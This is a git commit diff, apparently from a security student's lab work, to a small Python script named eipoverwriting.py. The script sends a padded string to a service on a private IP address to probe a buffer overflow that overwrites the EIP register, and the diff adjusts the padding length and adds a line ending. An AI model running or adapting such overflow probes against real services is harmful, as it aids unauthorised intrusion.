b2c8b9faf9926e81761a07f07b9d743b890d4778
bvillano05 <bvillano05@gmail.com>
2024-12-13 16:57:10 -0500

    Update eipoverwriting.py

--- eipoverwriting.py
+++ eipoverwriting.py
@@ -6,11 +6,11 @@ def main():
     IP = "192.168.192.167"
     PORT = 2223
 
-    garbage = "1" * 150
+    garbage = "1" * 75
     name = "BRAE"
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((IP, PORT))
-    sock.send(garbage.encode() + name.encode())
+    sock.send(garbage.encode() + name.encode() + "\r\n".encode())
 
 if __name__ == "__main__":
     main()
